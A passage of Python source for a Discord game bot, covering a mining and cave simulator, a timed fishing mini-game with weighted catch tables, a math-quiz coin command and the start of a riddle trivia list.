            for x in range(6):
    
                hp = random.randint(1, 3)
    
                r = random.random() * 100
    
                if cave_type == "chaos":
                    if r < 64:
                        effect = "normal"
                    elif r < 94:
                        effect = "small"
                    else:
                        effect = "big"
    
                elif cave_type == "special":
                    if r < 48:
                        effect = "normal"
                    elif r < 88:
                        effect = "small"
                    elif r < 98:
                        effect = "big"
                    else:
                        effect = "bonus"
    
                else:
                    if r < 70:
                        effect = "normal"
                    elif r < 95:
                        effect = "small"
                    else:
                        effect = "big"
    
                b = {
                    "emoji": "🟫",
                    "hp": hp,
                    "curr_hp": hp,
                    "max_hp": hp,
                    "coins": int(random.randint(500, 3000) * mult),
                    "xp": int(random.randint(300, 2000) * mult),
                    "effect": effect,
                    "claimed": False
                }
    
                row.append(b)
    
            grid.append(row)
    
        return grid

    def build(self):
        tier = get_pickaxe_tier(self.u)
        lvl = self.u.get("level", 1)
        cam = self.cam()
        grid = []
        px = self.u["mine_px"]
        py = self.u["mine_depth"]

        if self.u.get("in_cave"):
            max_dur = 50
        else:
            max_dur = get_max_durability(tier, lvl)

        if self.u.get("in_cave"):
            for y in range(10):
                row = []
                for x in range(6):
                    if x == self.u["cave_px"] and y == self.u["cave_py"]:
                        row.append("⛏️")
                    else:
                        block = self.u["cave_grid"][y][x]
                        if isinstance(block, dict) and block.get("type") == "empty":
                            row.append("⬜️")
                        else:
                            row.append("🟫")
                grid.append(" ".join(row))
        else:
            for y in range(cam, cam + 10):
                row = []
                for x in range(6):
                    if x == px and y == py:
                        row.append("⛏️")
                    else:
                        row.append(get_block(x, y)["emoji"])
                grid.append(" ".join(row) + f"   {y:>4}m")

        if self.u.get("in_cave"):
            display_damage = 1
        else:
            base_damage = power_of(tier)
            display_damage = round(base_damage * (1.035 ** lvl), 1)

        need = xp_need(lvl)
        xp = self.u["xp"]
        fill = int(min(10, xp / need * 10))
        bar = "▰" * fill + "▱" * (10 - fill)

        if self.u.get("repairing"):
            remain = max(0, int(self.u["repair_end"] - time.time()))
            dur_text = f"🔧 Repairing... {remain//60:02d}:{remain%60:02d}"
        else:
            dur_text = f"🔋 Durability: {self.u['durability']}/{max_dur}"

        log = self.log

        if self.target and not self.u.get("repairing"):
            t = self.target
            hp_ratio = t["curr_hp"] / t["max_hp"] if t["max_hp"] > 0 else 0
            hbar = "▰" * int(hp_ratio * 10) + "▱" * (10 - int(hp_ratio * 10))
            log = f"⛏️ {t['emoji']} {hbar} ({int(t['curr_hp'])}/{t['max_hp']})"

        if self.u.get("in_cave"):
            embed = discord.Embed(title="🕳️ Cave Simulator", color=0x8B4513)
            top_text = f"🕳️ Broke blocks: {self.u.get('cave_broken', 0)}\n"
            mining_title = "🕳️ Cave\n"
        else:
            embed = discord.Embed(title="⛏️ Mining Simulator", color=0x2b2d31)
            top_text = f"⛏️ Depth: {self.u['mine_depth']}m\n"
            mining_title = "⛏️ Mining\n"

        embed.description = (
            top_text +
            "━━━━━━━━━━━━━━━\n"
            + "\n".join(grid) +
            "\n━━━━━━━━━━━━━━━\n"
            + mining_title +
            f"{log}"
        )

        if self.u.get("in_cave"):
            money_line = f"💰 Total Earn: {self.u.get('cave_earn', 0)} 🪙\n"
        else:
            money_line = f"💰 Sack: {self.u['sack']} 🪙\n"

        embed.add_field(
            name="Stats",
            value=(
                f"{dur_text}\n"
                f"💪 Power: {display_damage}\n\n"
                f"{money_line}"
                f"⭐ XP: {xp}/{need}\n{bar}"
            ),
            inline=False
        )

        embed.add_field(
            name="Level",
            value=f"Mining Level {lvl}",
            inline=False
        )

        return embed

    async def repair_loop(self, message):
        while self.u.get("repairing"):
            remain = max(0, int(self.u["repair_end"] - time.time()))

            if remain <= 0:
                self.u["repairing"] = False

                lvl = self.u.get("level", 1)
                self.u["durability"] = get_max_durability(
                    get_pickaxe_tier(self.u), lvl
                )

                self.log = "🔧 Repair completed!"

                try:
                    await message.edit(embed=self.build(), view=self)
                except:
                    return

                save_data()
                return

            try:
                await message.edit(embed=self.build(), view=self)
            except:
                return

            await asyncio.sleep(1)

    async def move_cave(self, dx, dy, i):
        if self.u["durability"] <= 0:
            return await i.response.send_message(
                "❌ Durability is 0, press leave",
                ephemeral=True
            )

        tx = max(0, min(5, self.u["cave_px"] + dx))
        ty = max(0, min(9, self.u["cave_py"] + dy))

        grid = self.u["cave_grid"]
        block = grid[ty][tx]

        if not isinstance(block, dict) or block.get("type") == "empty":
            self.u["cave_px"] = tx
            self.u["cave_py"] = ty
            self.log = "Idle"

            return await i.response.edit_message(
                embed=self.build(),
                view=CaveView(self)
            )

        damage = 1

        block["curr_hp"] -= damage
        self.u["durability"] -= 1

        if block["curr_hp"] > 0:
            self.target = block
            self.log = "⛏️ Mining..."
            return await i.response.edit_message(
                embed=self.build(),
                view=CaveView(self)
            )

        earn, log = self.handle_cave_block(block, tx, ty)

        self.u["cave_earn"] += earn
        self.u["cave_broken"] += 1
        self.check_level_up()

        grid[ty][tx] = {"type": "empty"}
        self.target = None

        self.u["cave_px"] = tx
        self.u["cave_py"] = ty

        self.log = log
        save_data()

        return await i.response.edit_message(
            embed=self.build(),
            view=CaveView(self)
        )

    async def move(self, dx, dy, i):
        if self.u.get("in_cave"):
            return await self.move_cave(dx, dy, i)

        if self.u["durability"] <= 0 and not self.u.get("repairing", False):
            return await i.response.send_message(
                "🔧 Your pickaxe is broken! Repair it first.",
                ephemeral=True
            )

        if self.u.get("repairing"):
            return await i.response.send_message(
                "🔧 Repairing your pickaxe...",
                ephemeral=True
            )

        if self.locked:
            return

        self.locked = True

        try:
            tx = max(0, min(5, self.u["mine_px"] + dx))
            ty = max(0, self.u["mine_depth"] + dy)

            block = get_block(tx, ty)
            tier = get_pickaxe_tier(self.u)

            lvl = self.u.get("level", 1)
            level_mult = 1.035 ** lvl
            damage = max(1, int(power_of(tier) * level_mult))

            # ✅ 空白格只移動，不繼續挖，避免 interaction 重複回應
            if block["emoji"] == "⬜️":
                self.u["mine_px"] = tx
                self.u["mine_depth"] = ty
                self.target = None
                self.log = "Idle"
                save_data()
                return await i.response.edit_message(embed=self.build(), view=self)

            before = block["curr_hp"]
            block["curr_hp"] = max(0, before - damage)
            actual = max(0, before - block["curr_hp"])

            self.u["durability"] = max(0, self.u["durability"] - int(actual))

            if block["curr_hp"] > 0:
                self.target = block
                self.log = f"⛏️ Mining {block['emoji']}"
                save_data()

                return await i.response.edit_message(
                    embed=self.build(),
                    view=self
                )

            coins = block.get("coins", 0)
            xp = block.get("xp", 0)
            msg = f"✅ Broke {block['emoji']}!"
            mult = reward_mult(tier)
            depth = self.u["mine_depth"]

            if depth < 2000:
                depth_mult = 1
            else:
                step = (depth - 2000) // 1000 + 1
                depth_mult = 1.2 ** step

            lvl = self.u.get("level", 1)

            if block.get("Explosion"):
                msg = "💥 Explosion triggered!"

                for ex in [-1, 0, 1]:
                    for ey in [-1, 0, 1]:
                        nx, ny = tx + ex, ty + ey
                        if ny < 0:
                            continue

                        nb = get_block(nx, ny)

                        gain_c = nb.get("coins", 0)
                        gain_x = nb.get("xp", 0)

                        self.u["sack"] += int(gain_c * mult)
                        self.u["xp"] += int(gain_x * mult)

                        world[f"{nx},{ny}"] = {
                            "emoji": "⬜️",
                            "hp": 0,
                            "curr_hp": 0,
                            "max_hp": 0,
                            "coins": 0,
                            "xp": 0
                        }

            elif block.get("Nodura"):
                self.u["durability"] = 0
                msg = "☠️ Nodura activated! Durability wiped!"

            elif block.get("Chest"):
                gain = random.randint(200, 500)
                self.u["sack"] += gain
                msg = f"🎁 Chest found! +{gain} coins"

            elif block.get("Clear"):
                msg = "🌪 Clear activated!"

                for x in range(6):
                    nb = get_block(x, ty)
                    self.u["sack"] += int(nb.get("coins", 0) * mult)
                    self.u["xp"] += int(nb.get("xp", 0) * mult)

                    world[f"{x},{ty}"] = {
                        "emoji": "⬜️",
                        "hp": 0,
                        "curr_hp": 0,
                        "max_hp": 0,
                        "coins": 0,
                        "xp": 0
                    }

            elif block.get("Lucky"):
                mult2 = random.randint(1, 10)
                msg = f"🍀 Lucky x{mult2}!"

                self.u["sack"] += int(coins * mult * mult2)
                self.u["xp"] += int(xp * mult * mult2)

            elif block.get("Special"):
                self.u.setdefault("inventory", [])
                self.u["inventory"].append("💠 Crystal")
                msg = "💠 Crystal obtained!"

            elif block.get("Cave"):
                msg = "🕳 You fell into a cave!"

                self.u["in_cave"] = True
                self.u["cave_type"] = roll_cave_type()
                self.u["cave_grid"] = self.gen_cave()

                self.u["cave_px"] = max(0, min(5, tx))
                self.u["cave_py"] = max(0, min(9, ty % 10))

                self.u["cave_earn"] = 0
                self.u["cave_broken"] = 0
                self.u["durability"] = 50

                self.target = None
                self.log = msg

                world[f"{tx},{ty}"] = {
                    "emoji": "⬜️",
                    "hp": 0,
                    "curr_hp": 0,
                    "max_hp": 0,
                    "coins": 0,
                    "xp": 0
                }

                save_data()

                return await i.response.edit_message(
                    embed=self.build(),
                    view=CaveView(self)
                )

            else:
                self.u["sack"] += int(coins * mult * depth_mult)
                self.u["xp"] += int(xp * mult * depth_mult * (1.03 ** lvl))

            world[f"{tx},{ty}"] = {
                "emoji": "⬜️",
                "hp": 0,
                "curr_hp": 0,
                "max_hp": 0,
                "coins": 0,
                "xp": 0
            }

            self.u["mine_px"] = tx
            self.u["mine_depth"] = ty
            self.u["max_depth"] = max(self.u.get("max_depth", 0), ty)

            while True:
                lvl = self.u.get("level", 1)
                need = xp_need(lvl)

                if self.u["xp"] >= need:
                    self.u["xp"] -= need
                    self.u["level"] = lvl + 1
                else:
                    break

            self.target = None
            self.log = msg

            save_data()
            return await i.response.edit_message(embed=self.build(), view=self)

        finally:
            self.locked = False

    async def leave_cave(self, i):
        total = self.u.get("cave_earn", 0)

        self.u["sack"] += total
        self.u["in_cave"] = False
        self.u["cave_grid"] = None
        self.u["cave_earn"] = 0

        tier = get_pickaxe_tier(self.u)
        lvl = self.u.get("level", 1)
        self.u["durability"] = get_max_durability(tier, lvl)

        self.log = f"🕳 Earned {total} 🪙!"

        save_data()

        return await i.response.edit_message(
            embed=self.build(),
            view=self
        )

    @discord.ui.button(label="⬆️")
    async def up(self, i, b):
        await self.move(0, -1, i)

    @discord.ui.button(label="⬅️")
    async def left(self, i, b):
        await self.move(-1, 0, i)

    @discord.ui.button(label="⬇️")
    async def down(self, i, b):
        await self.move(0, 1, i)

    @discord.ui.button(label="➡️")
    async def right(self, i, b):
        await self.move(1, 0, i)

    @discord.ui.button(label="💰 SELL")
    async def sell(self, i, b):
        u = self.u
        u["coins"] += u["sack"]
        u["sack"] = 0
        self.log = "💰 Sold items"
        save_data()
        await i.response.edit_message(embed=self.build(), view=self)

    @discord.ui.button(label="🔧 REPAIR")
    async def repair(self, i, b):
        u = self.u

        if u["repairing"]:
            u["repairing"] = False
            u["repair_end"] = 0
            self.log = "❌ Repair canceled"
            save_data()
            return await i.response.edit_message(embed=self.build(), view=self)

        if u["coins"] < 500:
            return await i.response.send_message(
                "❌ Not enough coins",
                ephemeral=True
            )

        u["coins"] -= 500
        u["repairing"] = True

        lvl = u.get("level", 1)
        u["repair_end"] = time.time() + repair_time(lvl)

        self.log = "🔧 Started repairing!"
        save_data()

        await i.response.edit_message(embed=self.build(), view=self)

        msg = await i.original_response()
        asyncio.create_task(self.repair_loop(msg))


class CaveView(discord.ui.View):
    def __init__(self, parent):
        super().__init__(timeout=None)
        self.parent = parent

    @discord.ui.button(label="⬆️", style=discord.ButtonStyle.secondary)
    async def up(self, i, b):
        await self.parent.move_cave(0, -1, i)

    @discord.ui.button(label="⬅️", style=discord.ButtonStyle.secondary)
    async def left(self, i, b):
        await self.parent.move_cave(-1, 0, i)

    @discord.ui.button(label="⬇️", style=discord.ButtonStyle.secondary)
    async def down(self, i, b):
        await self.parent.move_cave(0, 1, i)

    @discord.ui.button(label="➡️", style=discord.ButtonStyle.secondary)
    async def right(self, i, b):
        await self.parent.move_cave(1, 0, i)

    @discord.ui.button(label="🚪 LEAVE", style=discord.ButtonStyle.danger)
    async def leave(self, i, b):
        await self.parent.leave_cave(i)


@tree.command(name="mine", description="Mining Game")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def mine(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    init_user(uid)

    view = MineView(uid)
    active_games[uid] = view

    await interaction.response.send_message(
        embed=view.build(),
        view=view
    )

# @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)

import discord
import random
import asyncio
import time
from discord import app_commands

# ==========================================
# ⚙️ Configuration & Pools
# ==========================================

SLOT_SIZE = 10
UPDATE_INTERVAL = 0.8 

if 'active_players' not in globals(): active_players = set()
if 'fishing_cooldowns' not in globals(): fishing_cooldowns = {}

FISH_INTERVAL = {1: (25, 35), 2: (18, 28), 3: (12, 20), 4: (8, 14), 5: (5, 8)}
LEVEL_MULTIPLIER = {1: 1.0, 2: 1.2, 3: 1.5, 4: 1.8, 5: 2.0}

SPECIAL_FISH = [
    "🌌 Void whale (CELESTIAL!!!)", "⚡ Storm eel (CELESTIAL!!!)", 
    "🧿 Deep abyss eye (CELESTIAL!!!)", "⛩️ Coral titan (CELESTIAL!!!)", 
    "🏺 Ancient relic catch (SPECIAL!!!)"
]

FISH_POOL = {
    1: [("🐟 Common fish", 60), ("🐡 Pufferfish", 20), ("🦑 Squid", 5), ("🗑️ Trash", 15)],
    2: [("🐟 Common fish", 55), ("🐡 Pufferfish", 35), ("🦑 Squid", 9), ("🦈 Shark (RARE!)", 1)],
    3: [("🐟 Common fish", 40), ("🐡 Pufferfish", 45), ("🦑 Squid", 13), ("🦈 Shark (RARE!)", 1.5), ("💰 Abyss chestfish (EPIC!)", 0.5)],
    4: [("🐟 Common fish", 30), ("🐡 Pufferfish", 45), ("🦑 Squid", 20), ("🦈 Shark (RARE!)", 3.45), ("💰 Abyss chestfish (EPIC!)", 1), ("🐉 Deep sea serpent (LEGENDARY!!!)", 0.25), ("💠 Crystal leviathan (LEGENDARY!!!)", 0.25), ("🏺 Ancient relic catch (SPECIAL!!!)", 0.05)],
    5: [("🐡 Pufferfish", 55), ("🦑 Squid", 35), ("🦈 Shark (RARE!)", 6.3), ("💰 Abyss chestfish (EPIC!)", 2.5), ("🐉 Deep sea serpent (LEGENDARY!!!)", 0.45), ("💠 Crystal leviathan (LEGENDARY!!!)", 0.45), ("🌌 Void whale (CELESTIAL!!!)", 0.08), ("⚡ Storm eel (CELESTIAL!!!)", 0.06), ("🧿 Deep abyss eye (CELESTIAL!!!)", 0.04), ("⛩️ Coral titan (CELESTIAL!!!)", 0.02), ("🏺 Ancient relic catch (SPECIAL!!!)", 0.1)]
}

class FishView(discord.ui.View):
    def __init__(self, uid: str, user_name: str, level: int):
        super().__init__(timeout=600)
        self.uid = uid
        self.user_name = user_name
        self.level = level
        self.running = False
        self.total_coins = 0
        self.caught_specials = []
        self.last_catch_text = "None"
        self.status_title = f"🎣 Fishing Rod Lvl {level}"
        self.current_status = "Press **Start** to begin fishing!"
        self.fish = None
        self.pos = None
        self.can_catch = False
        self.message = None
        self._main_task = None
        self.start_time = None

    def get_fish_price(self, name: str):
        prices = {
            "🐟 Common fish": 20, "🐡 Pufferfish": 40, "🦑 Squid": 80, 
            "🦈 Shark (RARE!)": 200, "💰 Abyss chestfish (EPIC!)": 800, 
            "🐉 Deep sea serpent (LEGENDARY!!!)": 2200, "💠 Crystal leviathan (LEGENDARY!!!)": 2400,
            "🗑️ Trash": 0  # 價格已更改為 0
        }
        if name in SPECIAL_FISH or name not in prices: return 0
        return int(prices[name] * LEVEL_MULTIPLIER[self.level])

    def create_embed(self):
        elapsed = int(time.time() - self.start_time) if self.start_time else 0
        duration = f"{elapsed // 60}m {elapsed % 60}s"
        
        water = ["🌊"] * 10
        water[0] = "🪝"
        if self.pos is not None: 
            water[self.pos] = "🐠"
        
        desc = (f"🐟 @{self.user_name} is fishing for {duration}...\n\n"
                f"**{self.status_title}**\n"
                f"💸 Last catch: {self.last_catch_text}\n"
                f"{self.current_status}\n\n"
                f"{''.join(water)}")
        return discord.Embed(description=desc, color=discord.Color.blue())

    async def safe_update(self, interaction: discord.Interaction = None, status_msg=None):
        if status_msg:
            self.current_status = status_msg
        
        try:
            embed = self.create_embed()
            if interaction and not interaction.response.is_done():
                await interaction.response.edit_message(embed=embed, view=self)
            elif interaction:
                await interaction.edit_original_response(embed=embed, view=self)
            else:
                await self.message.edit(embed=embed, view=self)
        except Exception as e:
            print(f"Update failed: {e}")

    async def flash_status(self, catch_msg):
        old_title = f"🎣 Fishing Rod Lvl {self.level}"
        self.status_title = catch_msg
        await self.safe_update()
        await asyncio.sleep(5)
        self.status_title = old_title
        await self.safe_update()

    async def main_engine(self, interaction: discord.Interaction):
        while self.running:
            # 強制 5 分鐘結算檢查
            elapsed = time.time() - self.start_time
            if elapsed >= 300:
                self.running = False
                await self.finalize_session(interaction, True)
                break

            self.current_status = "🌊 Waiting for a bite..."
            wait_target = random.uniform(*FISH_INTERVAL[self.level])
            wait_start = time.time()
            
            while time.time() - wait_start < wait_target and self.running:
                if time.time() - self.start_time >= 300:
                    self.running = False
                    break
                await self.safe_update(interaction)
                await asyncio.sleep(1.2)
            
            if not self.running: break

            self.fish = random.choices([f[0] for f in FISH_POOL[self.level]], weights=[f[1] for f in FISH_POOL[self.level]])[0]
            self.pos = 9
            
            while self.pos >= 0 and self.running:
                if time.time() - self.start_time >= 300:
                    self.running = False
                    break

                if self.pos == 0:
                    self.can_catch = True
                    await self.safe_update(interaction, "🎯 **CATCH!**")
                    await asyncio.sleep(2)
                    self.can_catch = False
                    break
                else:
                    await self.safe_update(interaction, "🐟 Something is approaching...")
                    await asyncio.sleep(1)
                    self.pos -= 1
            
            self.fish = self.pos = None
            await self.safe_update(interaction)

        if not self.running and time.time() - self.start_time >= 300:
             await self.finalize_session(interaction, True)

    async def finalize_session(self, interaction: discord.Interaction, forced=False):
        if not self.uid in active_players: return 

        play_time = time.time() - self.start_time
        if play_time > 300: play_time = 300 
        
        async with get_user_lock(self.uid):
            user = init_user(self.uid)
            user["coins"] += self.total_coins
            user.setdefault("inventory", []).extend(self.caught_specials)
            save_data()

        cd = play_time * 2
        fishing_cooldowns[self.uid] = time.time() + cd
        active_players.discard(self.uid)

        msg = "🛑 **Session Force Closed (5m Limit)!**" if forced else "🏠 **Session Finished!**"
        
        try:
            content = f"{msg}\n\n🎣Player: @{self.user_name}\n💰 Total Earned: **{self.total_coins}** 🪙\n🎒 Specials: {len(self.caught_specials)}\n⏳ Cooldown: {int(cd//60)}m {int(cd%60)}s"
            if not interaction.response.is_done():
                await interaction.response.edit_message(content=content, embed=None, view=None)
            else:
                await interaction.edit_original_response(content=content, embed=None, view=None)
        except:
            pass
        self.stop()

    @discord.ui.button(label="Start", style=discord.ButtonStyle.green)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid: return
        self.running = True
        self.start_time = time.time()
        button.disabled = True
        await interaction.response.edit_message(embed=self.create_embed(), view=self)
        self._main_task = asyncio.create_task(self.main_engine(interaction))

    @discord.ui.button(label="Catch", style=discord.ButtonStyle.blurple)
    async def catch(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid: return await interaction.response.defer()
        if self.can_catch and self.fish:
            price = self.get_fish_price(self.fish)
            self.last_catch_text = self.fish
            if self.fish in SPECIAL_FISH:
                self.caught_specials.append(self.fish)
                display = f"✅ Caught {self.fish}! (Stored)"
            else:
                self.total_coins += price
                display = f"✅ Caught {self.fish}! +{price}🪙"
            self.can_catch = self.fish = None
            asyncio.create_task(self.flash_status(display))
            await interaction.response.defer()
        else:
            await interaction.response.defer()

    @discord.ui.button(label="Finish", style=discord.ButtonStyle.red)
    async def finish(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid: return
        self.running = False
        if self._main_task: self._main_task.cancel()
        await self.finalize_session(interaction, False)

# ==========================================
# 🚀 Slash Command
# ==========================================

@tree.command(name="fish", description="Start fishing")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True) # Context 已加入
async def fish(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    if uid in active_players: return await interaction.response.send_message("❌ Already fishing!", ephemeral=True)
    if fishing_cooldowns.get(uid, 0) > time.time():
        rem = fishing_cooldowns[uid] - time.time()
        return await interaction.response.send_message(f"⏳ Cooldown: {int(rem//60)}m {int(rem%60)}s", ephemeral=True)

    user = init_user(uid)
    inv = user.get("inventory", [])
    level = next((i for i in range(5, 1, -1) if f"Fishing Rod Lvl {i}" in inv), 1 if "Fishing Rod" in inv else None)
    if level is None: return await interaction.response.send_message("❌ You need a Fishing Rod!", ephemeral=True)

    active_players.add(uid)
    view = FishView(uid, interaction.user.display_name, level)
    await interaction.response.send_message(embed=view.create_embed(), view=view)
    
class EarnView(discord.ui.View):
    def __init__(self, uid, correct_answer, reward):
        super().__init__(timeout=5.0)
        self.uid = uid
        self.correct_answer = correct_answer
        self.reward = reward
        self.answered = False

    async def check_ans(self, interaction, choice_val):
        if str(interaction.user.id) != self.uid:
            return await interaction.response.send_message("❌ This is not your question!", ephemeral=True)
        
        self.answered = True
        for child in self.children: child.disabled = True
        
        if choice_val == self.correct_answer:
            user = init_user(self.uid)
            user["coins"] += self.reward
            save_data()
            await interaction.response.edit_message(content=_t(self.uid, "earn_success", amt=self.reward), view=self)
        else: 
            await interaction.response.edit_message(content=_t(self.uid, "earn_fail", ans=self.correct_answer), view=self)
        self.stop()

    async def on_timeout(self):
        if not self.answered:
            user = init_user(self.uid)
            user["coins"] -= 10
            save_data()
            try:
                for child in self.children: child.disabled = True
                await self.message.edit(content=_t(self.uid, "timeout_penalty"), view=self)
            except Exception: pass

@tree.command(name="earn", description="Earn coins by solving simple math problems")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def earn(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    user = init_user(uid)
    now = time.time()
    last_earn = user.get("last_earn", 0)
    if now - last_earn < 60: return await interaction.response.send_message(_t(uid, "earn_cooldown", sec=int(60 - (now - last_earn))), ephemeral=True)
    user["last_earn"] = now
    save_data()
    a, b = random.randint(1, 20), random.randint(1, 20)
    op = random.choice(["+", "-", "*"])
    if op == "-": a, b = max(a,b), min(a,b)
    elif op == "*": a, b = a//2, b//2
    ans = eval(f"{a}{op}{b}")
    choices = set([ans])
    while len(choices) < 4:
        o = random.randint(-10, 10)
        if o != 0 and ans+o >= 0: choices.add(ans+o)
    choices = list(choices)
    random.shuffle(choices)

    view = EarnView(uid, ans, random.randint(20, 60))
    for c in choices:
        btn = discord.ui.Button(label=str(c), style=discord.ButtonStyle.primary)
        btn.callback = lambda i, c_val=c: view.check_ans(i, c_val)
        view.add_item(btn)
        
    await interaction.response.send_message(_t(uid, "earn_prompt", math_eq=f"{a} {op} {b}"), view=view)
    view.message = await interaction.original_response()

TRIVIA_POOL = [
    ("What has keys but opens no locks?", ["Piano", "Keyboard", "Map", "Computer"], "Piano"),
    ("What gets wetter the more it dries?", ["Towel", "Sponge", "Wind", "Sun"], "Towel"),
    ("What has a head and a tail but no body?", ["Coin", "Snake", "Worm", "River"], "Coin"),
    ("What building has the most stories?", ["Library", "Skyscraper", "Hotel", "Bank"], "Library"),
    ("What goes up but never comes down?", ["Age", "Smoke", "Balloon", "Elevator"], "Age"),
    ("What can you break without ever touching it?", ["Promise", "Glass", "Record", "Law"], "Promise"),
    ("What has a neck but no head?", ["Bottle", "Shirt", "Guitar", "Vase"], "Bottle"),
    ("What has 13 hearts but no other organs?", ["Deck of cards", "Hospital", "Worm", "Octopus"], "Deck of cards"),
    ("What is always coming but never arrives?", ["Tomorrow", "Monday", "Next year", "Future"], "Tomorrow"),
    ("What belongs to you, but others use it more?", ["Your name", "Your house", "Your phone", "Your car"], "Your name"),
    ("What gets bigger the more you take away?", ["Hole", "Debt", "Problem", "Shadow"], "Hole"),
    ("What has hands but can't clap?", ["Clock", "Statue", "Tree", "Robot"], "Clock"),
    ("What has a bottom at the top?", ["Your legs", "A canyon", "A mountain", "A bottle"], "Your legs"),
    ("What runs but never walks?", ["River", "Wind", "Engine", "Time"], "River"),
    ("What has a thumb and four fingers but isn't alive?", ["Glove", "Mitten", "Handprint", "Shadow"], "Glove"),
    ("What is full of holes but still holds water?", ["Sponge", "Net", "Bucket", "Filter"], "Sponge"),
    ("What 5-letter word becomes shorter when you add 2 letters?", ["Short", "Long", "Small", "Tall"], "Short"),
    ("What begins with T, ends with T, and has T in it?", ["Teapot", "Tent", "Target", "Toast"], "Teapot"),
    ("What tastes better than it smells?", ["Tongue", "Durian", "Garlic", "Cheese"], "Tongue"),
    ("What has four wheels and flies?", ["Garbage truck", "Airplane", "Skateboard", "Car"], "Garbage truck"),
    ("If 1=3, 2=3, 3=5, 4=4, 5=4. What does 6 equal?", ["3", "4", "5", "6"], "3"),
    ("Guard says '12', reply '6'. Guard says '6', reply '3'. Guard says '10', reply?", ["3", "5", "4", "2"], "3"),
    ("Sequence: O, T, T, F, F, S, S, E, N, _?", ["T", "O", "E", "N"], "T"),
    ("Sequence: 1, 11, 21, 1211, 111221, _?", ["312211", "121121", "211211", "311221"], "312211"),
    ("Bat & ball cost $1.10. Bat costs $1 more than ball. Ball cost?", ["$0.05", "$0.10", "$0.01", "$0.50"], "$0.05"),
    ("5 machines make 5 widgets in 5 mins. 100 machines make 100 widgets in?", ["5 minutes", "100 minutes", "1 minute", "50 minutes"], "5 minutes"),
    ("Lily pads double daily. Cover lake in 48 days. Half covered in?", ["47", "24", "25", "46"], "47"),
    ("Pass the person in 2nd place. What place are you?", ["Second", "First", "Third", "Last"], "Second"),
    ("Farmer has 17 sheep, all but 9 die. How many left?", ["9", "8", "17", "0"], "9"),
    ("How many times can you subtract 5 from 25?", ["Once", "Five", "Zero", "Infinite"], "Once"),
    ("Man pushes car to hotel, tells owner he's bankrupt. Why?", ["Playing Monopoly", "Valet driver", "Car broke down", "Robbed"], "Playing Monopoly"),
    ("Windowless room, 3 bulbs, 3 switches outside. Enter ONCE. How to match?", ["Feel the heat", "Flip all on", "Flip fast", "Use mirror"], "Feel the heat"),
    ("Two fathers, two sons, 3 fish caught. Each gets 1. How?", ["Grandfather, father, son", "Pregnant fish", "Whale caught", "Someone lied"], "Grandfather, father, son"),
    ("Black dog, black street, broken lights. Black car swerves. How?", ["Daytime", "Moon bright", "Night vision", "Dog barked"], "Daytime"),
    ("Photo: 'Brothers/sisters none, but that man's father is my father's son.' Who?", ["His son", "Himself", "His father", "His nephew"], "His son"),
    ("3 boxes: Apples, Oranges, Both. ALL mislabeled. Pick 1 fruit to fix labels?", ["Both", "Apples", "Oranges", "None"], "Both"),
    ("Two doors: heaven/hell. One liar, one truth-teller. One question?", ["What would other say?", "Which is heaven?", "Are you liar?", "What door yours?"], "What would other say?"),
    ("Dark room: match, candle, oil lamp, wood stove. What light first?", ["The match", "The candle", "The lamp", "The stove"], "The match"),
    ("Red house = red bricks. Blue house = blue bricks. Greenhouse?", ["Glass", "Green bricks", "Wood", "Plastic"], "Glass"),
    ("Heavier: a ton of bricks or a ton of feathers?", ["Neither", "Bricks", "Feathers", "Depends"], "Neither"),
    ("What 5-letter word reads the same upside down in ALL CAPS?", ["SWIMS", "RACECAR", "LEVEL", "WOW"], "SWIMS"),
    ("Starts with P, ends with E, contains thousands of letters?", ["Post office", "Package", "Pipeline", "Pancake"], "Post office"),
    ("Must be broken before you can eat it?", ["Coconut", "Banana", "Apple", "Mango"], "Coconut"),
    ("Has a heart that doesn't beat?", ["Artichoke", "Robot", "Doll", "Clock"], "Artichoke"),
    ("Goes up and down but never moves?", ["Stairs", "Sky", "Bird", "Yoyo"], "Stairs"),
    ("If I have it, I don't share it. If I share it, I don't have it?", ["Secret", "Cake", "Money", "Idea"], "Secret"),
    ("Maker sells it. Buyer never uses it. User never knows it?", ["Coffin", "Poison", "Secret", "Lie"], "Coffin"),
    ("100 teams, single elimination. Total matches played?", ["99", "100", "50", "49"], "99"),
    ("9 identical dots, 1 heavier. Balance scale. Min weighings to find?", ["2", "3", "4", "5"], "2"),
    ("Monkey, squirrel, bird race up coconut tree for banana. Winner?", ["None", "Monkey", "Squirrel", "Bird"], "None"),
    ("Dirt in a hole 3ft deep & 6ft wide?", ["None", "18 sq ft", "54 sq ft", "9 sq ft"], "None"),
    ("Begins with E, only contains one letter?", ["Envelope", "Eye", "Eagle", "Egg"], "Envelope"),
    ("Forward I am heavy, backward I am not. What am I?", ["Ton", "Rock", "Ship", "Car"], "Ton"),
    ("Room with no doors or windows?", ["Mushroom", "Classroom", "Courtroom", "Chatroom"], "Mushroom"),
    ("How can a man go 8 days without sleep?", ["Sleeps at night", "Coma", "Coffee", "Magic"], "Sleeps at night"),
    ("Invention to look right through a wall?", ["Window", "X-ray", "Drill", "Door"], "Window"),
    ("Loud sound when changing. Gets bigger but weighs less?", ["Popcorn", "Balloon", "Bomb", "Ice"], "Popcorn"),
    ("Woman shoots husband, holds underwater, hangs him. They dine. How?", ["Took a photo", "He's immortal", "CPR", "It's a game"], "Took a photo"),
    ("Simple, points, guides men worldwide?", ["Compass", "Map", "Sign", "Star"], "Compass"),
    ("Tear one off, scratch head, red becomes black?", ["Match", "Scab", "Sticker", "Paint"], "Match"),
    ("Before Everest discovered, highest mountain?", ["Everest", "K2", "Kilimanjaro", "Fuji"], "Everest"),
    ("As big as you, weighs nothing?", ["Shadow", "Reflection", "Soul", "Mind"], "Shadow"),
    ("Draw a line. Make it longer without touching?", ["Draw shorter beside it", "Erase it", "Bend it", "Look closely"], "Draw shorter beside it"),
    ("People make me, save me, change me, raise me?", ["Money", "Child", "Crop", "House"], "Money"),
